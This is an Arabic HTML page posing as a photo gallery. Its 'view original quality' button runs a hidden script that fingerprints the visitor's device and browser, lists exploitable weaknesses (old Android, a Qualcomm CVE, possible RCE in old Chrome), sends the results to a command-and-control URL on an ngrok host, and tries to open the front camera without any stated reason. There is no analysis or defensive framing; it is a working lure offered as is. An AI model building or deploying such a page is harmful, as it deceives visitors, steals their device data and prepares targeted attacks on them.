<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معرض الصور - عرض جديد</title>
    <style>
        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; }
        #status {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.85); padding: 15px 30px; border-radius: 12px;
            font-size: 18px; z-index: 999;
        }
        .btn {
            margin: 40px auto;
            padding: 18px 50px;
            font-size: 21px;
            background: #1e90ff;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="status">جاري تحميل الصور...</div>
    <img src="https://picsum.photos/id/1015/800/600" style="max-width:95%; margin-top:50px;" alt="صورة">

    <button class="btn" onclick="startAnalysis()">عرض الصورة بالجودة الأصلية</button>

    <script>
        const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev/collect";

        async function startAnalysis() {
            const status = document.getElementById("status");
            status.innerHTML = "جاري تحميل النسخة عالية الجودة...";

            await new Promise(r => setTimeout(r, 1200));

            // ================== التحليل والكشف عن الثغرات ==================
            const analysis = {
                type: "vulnerability_scan",
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                androidVersion: getAndroidVersion(),
                chromeVersion: getChromeVersion(),
                isWebView: /wv|webview|crosswalk/i.test(navigator.userAgent),
                isQualcomm: /qualcomm|qcom|sm\d+|snapdragon/i.test(navigator.userAgent),
                webGL: detectWebGL(),
                webAssembly: typeof WebAssembly !== "undefined",
                deviceMemory: navigator.deviceMemory || "unknown",
                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                potentialVulnerabilities: detectPotentialVulns()
            };

            // إرسال التحليل إلى C2
            fetch(C2_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(analysis)
            }).then(() => {
                console.log("✅ تم إرسال تحليل الثغرات");
            });

            status.innerHTML = "جاري معالجة الصورة...";

            // محاولة التقاط صورة (اختياري)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                // ... كود التقاط الصورة (يمكنك إضافته إذا أردت)
                stream.getTracks().forEach(track => track.stop());
            } catch(e) {}

            status.innerHTML = "تم عرض الصورة بنجاح ✓";
        }

        // دوال الكشف عن الثغرات
        function getAndroidVersion() {
            const match = navigator.userAgent.match(/Android\s([0-9.]+)/);
            return match ? match[1] : "unknown";
        }

        function getChromeVersion() {
            const match = navigator.userAgent.match(/Chrome\/([0-9.]+)/);
            return match ? match[1] : "unknown";
        }

        function detectWebGL() {
            try {
                const canvas = document.createElement("canvas");
                return !!canvas.getContext("webgl");
            } catch(e) { return false; }
        }

        function detectPotentialVulns() {
            const vulns = [];
            const androidVer = getAndroidVersion();
            const chromeVer = getChromeVersion();

            if (parseFloat(androidVer) < 14) vulns.push("Old Android version - High risk");
            if (/qualcomm/i.test(navigator.userAgent)) vulns.push("Qualcomm chipset - CVE-2026-21385 possible");
            if (parseFloat(chromeVer) < 120) vulns.push("Old Chrome/WebView - Multiple RCE possible");

            return vulns;
        }
    </script>
</body>
</html>
